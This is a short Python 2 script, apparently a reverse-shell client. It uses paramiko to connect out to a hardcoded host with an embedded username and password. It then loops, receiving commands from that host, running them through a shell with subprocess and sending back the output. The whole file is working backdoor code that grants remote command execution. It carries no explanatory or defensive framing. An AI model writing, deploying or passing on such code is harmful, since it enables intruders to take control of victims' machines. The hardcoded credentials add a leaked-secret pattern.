import paramiko
import threading
import subprocess

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('192.168.1.100', username='joridos', password='olh234')
chan = client.get_transport().open_session()
chan.send('Hey i am connected :) ')
while True:
    command = chan.recv(1024)
    try:
        CMD = subprocess.check_output(command, shell=True)
        chan.send(CMD)
    except Exception,e:
        chan.send(str(e))
print chan.recv(1024)
client.close